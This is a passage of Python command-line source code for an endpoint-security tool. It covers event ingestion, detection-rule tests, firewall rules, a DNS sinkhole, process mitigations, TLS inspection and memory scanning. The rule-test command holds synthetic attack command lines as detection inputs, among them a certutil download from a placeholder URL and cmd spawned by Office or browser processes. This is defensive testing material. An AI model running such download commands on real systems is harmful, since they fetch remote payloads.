        click.echo(
            "  (delete the safety copy yourself once you've verified "
            "the restore — we leave it for you)"
        )
    audit_log(
        actor="cli",
        action="backup.restore",
        status="ok",
        file_path=str(res.restored_from),
        details={
            "safety_backup": str(res.safety_backup) if res.safety_backup else None,
            "force": force,
        },
    )


# ===========================================================================
# v3.0 BEASTMODE — CLI subcommand groups for the new modules.
# ===========================================================================

# ---------------------------------------------------------------------------
# realtime — ETW + Sysmon + correlator + enforcer
# ---------------------------------------------------------------------------


@main.group("realtime")
def realtime_group() -> None:
    """Real-time event ingestion (ETW + Sysmon → correlator → enforcer)."""


@realtime_group.command("status")
def realtime_status() -> None:
    """Show whether ETW + Sysmon consumers are wired and what's available."""
    from deepsecurity.realtime.etw import EtwListener
    from deepsecurity.realtime.sysmon import CHANNEL, SysmonConsumer

    out: dict[str, object] = {"etw": {}, "sysmon": {}}

    # ETW availability — just probe the import.
    try:
        import etw  # type: ignore[import-not-found]  # noqa: F401  # from pywintrace

        out["etw"] = {"available": True, "providers": list(EtwListener.PROVIDERS)}
    except ImportError:
        out["etw"] = {
            "available": False,
            "hint": 'pip install "deepsecurity[edr]"',
        }

    # Sysmon channel exists?
    try:
        import win32evtlog  # type: ignore[import-not-found]

        from deepsecurity.realtime.sysmon import _channel_exists

        out["sysmon"] = {
            "channel": CHANNEL,
            "installed": _channel_exists(win32evtlog, CHANNEL),
            "consumer_class": SysmonConsumer.__name__,
        }
    except ImportError:
        out["sysmon"] = {
            "available": False,
            "hint": 'pip install "deepsecurity[windows-edr]"',
        }
    click.echo(json.dumps(out, indent=2))


@realtime_group.command("test-rule")
@click.argument("rule_id", type=click.Choice(["R-PC-001", "R-PC-002", "R-PC-003", "R-LB-001"]))
def realtime_test_rule(rule_id: str) -> None:
    """Fire a synthetic event through the correlator and print the detection.

    Useful for proving the rules are wired even without ETW or Sysmon
    actually emitting anything.
    """
    from deepsecurity.realtime.correlator import Correlator, UnifiedEvent

    hits: list = []
    c = Correlator(emit=hits.append)

    if rule_id in ("R-PC-001", "R-PC-002", "R-PC-003"):
        parent_image_map = {
            "R-PC-001": r"C:\Office\winword.exe",
            "R-PC-002": r"C:\Reader\AcroRd32.exe",
            "R-PC-003": r"C:\Chrome\chrome.exe",
        }
        c._tree.add(999, None, parent_image_map[rule_id])
        c.consume(
            UnifiedEvent(
                kind="process_create",
                pid=1000,
                parent_pid=999,
                image=r"C:\Windows\System32\cmd.exe",
                cmdline="cmd /c whoami",
            )
        )
    elif rule_id == "R-LB-001":
        c.consume(
            UnifiedEvent(
                kind="process_create",
                pid=1000,
                parent_pid=4,
                image=r"C:\Windows\System32\certutil.exe",
                cmdline="certutil -urlcache -split -f http://x/y x",
            )
        )

    matched = [h for h in hits if h.rule_id == rule_id]
    if matched:
        click.echo(f"OK    {rule_id} fired: {matched[0].summary}")
        click.echo(json.dumps({"mitre": list(matched[0].mitre_tags),
                               "severity": matched[0].severity,
                               "evidence": matched[0].evidence}, indent=2))
        sys.exit(0)
    click.echo(f"FAIL  {rule_id} did not fire (hits={[h.rule_id for h in hits]})")
    sys.exit(1)


# ---------------------------------------------------------------------------
# firewall — WinDivert + Defender Firewall API
# ---------------------------------------------------------------------------


@main.group("firewall")
def firewall_group() -> None:
    """Host-based firewall management (Defender Firewall + WinDivert)."""


@firewall_group.command("add-block")
@click.option("--name", required=True, help="Rule name (will be prefixed with deepsec-).")
@click.option("--remote-ip", default=None, help="CIDR or single IP to block.")
@click.option("--remote-port", type=int, default=None)
@click.option("--protocol", type=click.Choice(["tcp", "udp", "any"]), default="any")
@click.option(
    "--direction", type=click.Choice(["inbound", "outbound"]), default="outbound"
)
def firewall_add_block(
    name: str, remote_ip: str | None, remote_port: int | None,
    protocol: str, direction: str,
) -> None:
    """Add a Defender Firewall BLOCK rule. Persistent across reboots."""
    from deepsecurity.firewall.wfwapi import DefenderFirewall

    fw = DefenderFirewall()
    if not fw.available:
        click.echo("Defender Firewall API unavailable (Windows + pywin32 required)")
        sys.exit(2)
    full_name = name if name.startswith("deepsec-") else f"deepsec-{name}"
    ok = fw.add_block(
        name=full_name, remote_ip=remote_ip, remote_port=remote_port,
        protocol=protocol, direction=direction,
    )
    click.echo(f"{'OK' if ok else 'FAIL'}  rule={full_name}")
    sys.exit(0 if ok else 1)


@firewall_group.command("remove")
@click.argument("name")
def firewall_remove(name: str) -> None:
    """Remove a managed firewall rule by name."""
    from deepsecurity.firewall.wfwapi import DefenderFirewall

    fw = DefenderFirewall()
    if not fw.available:
        click.echo("Defender Firewall API unavailable")
        sys.exit(2)
    full_name = name if name.startswith("deepsec-") else f"deepsec-{name}"
    ok = fw.remove(full_name)
    click.echo(f"{'OK' if ok else 'FAIL'}  removed {full_name}")
    sys.exit(0 if ok else 1)


@firewall_group.command("list")
def firewall_list() -> None:
    """List all DEEPSecurity-managed firewall rules."""
    from deepsecurity.firewall.wfwapi import DefenderFirewall

    fw = DefenderFirewall()
    if not fw.available:
        click.echo("Defender Firewall API unavailable")
        sys.exit(2)
    rules = fw.list_managed()
    click.echo(json.dumps(rules, indent=2, default=str))


# ---------------------------------------------------------------------------
# dns — local sinkhole
# ---------------------------------------------------------------------------


@main.group("dns")
def dns_group() -> None:
    """Local DNS sinkhole (Pi-hole-style domain blocking)."""


@dns_group.command("update-blocklist")
@click.option(
    "--path", default=None,
    help="Override DEEPSEC_DNS_SINKHOLE_BLOCKLIST_PATH.",
)
def dns_update_blocklist(path: str | None) -> None:
    """Fetch the blocklist feeds and write the deduplicated domain list."""
    from pathlib import Path as _P

    from deepsecurity.config import settings as _settings
    from deepsecurity.dns_sinkhole.blocklists import fetch_all

    target = _P(path) if path else _P(_settings.dns_sinkhole_blocklist_path)
    result = fetch_all(target)
    click.echo(json.dumps(result, indent=2))


@dns_group.command("status")
def dns_status() -> None:
    """Show how many domains are in the sinkhole blocklist."""
    from pathlib import Path as _P

    from deepsecurity.config import settings as _settings
    from deepsecurity.dns_sinkhole.blocklists import load as _load

    p = _P(_settings.dns_sinkhole_blocklist_path)
    blocked = _load(p)
    click.echo(json.dumps({"path": str(p), "domains_blocked": len(blocked),
                           "exists": p.exists()}, indent=2))


@dns_group.command("test-block")
@click.argument("domain")
def dns_test_block(domain: str) -> None:
    """Test whether a given domain would be blocked by the current list."""
    from pathlib import Path as _P

    from deepsecurity.config import settings as _settings
    from deepsecurity.dns_sinkhole.blocklists import load as _load

    block = _load(_P(_settings.dns_sinkhole_blocklist_path))
    name = domain.lower().rstrip(".")
    direct = name in block
    parent = False
    labels = name.split(".")
    for i in range(len(labels) - 1):
        if ".".join(labels[i:]) in block:
            parent = True
            break
    click.echo(
        json.dumps({"domain": name, "blocked": bool(direct or parent),
                    "by_direct_match": direct, "by_parent_label": parent}, indent=2)
    )


# ---------------------------------------------------------------------------
# protection — Windows service + watchdog twin + mitigations
# ---------------------------------------------------------------------------


@main.group("protection")
def protection_group() -> None:
    """Self-protection (service + twin + mitigation policies)."""


@protection_group.command("apply-mitigations")
@click.option(
    "--cig-enforce",
    is_flag=True,
    help=(
        "Apply Code Integrity Guard in ENFORCE mode (only Microsoft-signed "
        "DLLs can load). Default is audit mode — log violations without "
        "blocking. Enforce can break the process if a transitive dep ships "
        "an unsigned native module; audit your deploy first."
    ),
)
def protection_apply_mitigations(cig_enforce: bool) -> None:
    """Apply SetProcessMitigationPolicy to the CURRENT process.

    Useful for testing: spawn a Python REPL, run this, then try to
    spawn a child or load a non-Microsoft DLL — should be blocked.
    """
    from deepsecurity.config import settings
    from deepsecurity.protection.mitigations import apply_recommended

    enforce = cig_enforce or getattr(settings, "mitigations_cig_enforce", False)
    results = apply_recommended(cig_enforce=enforce)
    if not results:
        click.echo("(not Windows or kernel32 unavailable; nothing applied)")
        sys.exit(0)
    click.echo(json.dumps(results, indent=2))


@protection_group.command("service-status")
def protection_service_status() -> None:
    """Query the SCM state of the DEEPSecurity service."""
    from deepsecurity.protection import service as _svc

    state = _svc.status_service()
    click.echo(json.dumps({"service": _svc.SERVICE_NAME, "state": state}, indent=2))


@protection_group.command("install")
def protection_install() -> None:
    """Install the DEEPSecurity Windows Service (admin required)."""
    from deepsecurity.protection import service as _svc

    ok = _svc.install()
    sys.exit(0 if ok else 1)


@protection_group.command("uninstall")
def protection_uninstall() -> None:
    """Uninstall the Windows Service (admin required)."""
    from deepsecurity.protection import service as _svc

    ok = _svc.uninstall()
    sys.exit(0 if ok else 1)


# ---------------------------------------------------------------------------
# tls — opt-in TLS inspection
# ---------------------------------------------------------------------------


@main.group("tls")
def tls_group() -> None:
    """Opt-in TLS inspection via mitmproxy (requires CA install)."""


@tls_group.command("install-ca")
def tls_install_ca() -> None:
    """Install the mitmproxy CA into the OS trusted-root store."""
    from deepsecurity.tls_proxy.ca import install as _install

    ok = _install()
    sys.exit(0 if ok else 1)


@tls_group.command("uninstall-ca")
def tls_uninstall_ca() -> None:
    """Remove the mitmproxy CA from the OS trusted-root store."""
    from deepsecurity.tls_proxy.ca import uninstall as _uninstall

    ok = _uninstall()
    sys.exit(0 if ok else 1)


@tls_group.command("status")
def tls_status() -> None:
    """Show whether mitmproxy is installed and the CA is present."""
    from pathlib import Path as _P

    from deepsecurity.tls_proxy.ca import CA_CER, CA_PEM

    try:
        import mitmproxy  # type: ignore[import-not-found]  # noqa: F401

        mitm = True
    except ImportError:
        mitm = False
    cer_present = _P(CA_CER).exists()
    pem_present = _P(CA_PEM).exists()
    click.echo(
        json.dumps(
            {
                "mitmproxy_installed": mitm,
                "ca_pem_present": pem_present,
                "ca_cer_present": cer_present,
                "hint": (
                    None
                    if mitm
                    else 'pip install "deepsecurity[tls-proxy]"'
                ),
            },
            indent=2,
        )
    )


# ---------------------------------------------------------------------------
# memory — userspace process-memory inspection
# ---------------------------------------------------------------------------


@main.group("memory")
def memory_group() -> None:
    """Userspace process-memory inspection (limited; SYSTEM-protected procs out of scope)."""


@memory_group.command("scan")
@click.argument("pid", type=int)
@click.option(
    "--max-mb", type=int, default=256,
    help="Cap total scanned bytes (MiB). Default: 256.",
)
def memory_scan(pid: int, max_mb: int) -> None:
    """Scan a process's memory for DLP patterns. Outputs JSON findings."""
    from deepsecurity.memory_scan.inspector import scan_pid

    findings = scan_pid(pid, max_bytes=max_mb * 1024 * 1024)
    out = [
        {
            "pattern": f.pattern_name,
            "severity": f.severity,
            "address": hex(f.address),
            "region_size": f.region_size,
            "preview": f.redacted_preview,
        }
        for f in findings
    ]
    click.echo(json.dumps({"pid": pid, "findings": out, "total": len(out)}, indent=2))


if __name__ == "__main__":
    sys.exit(main())
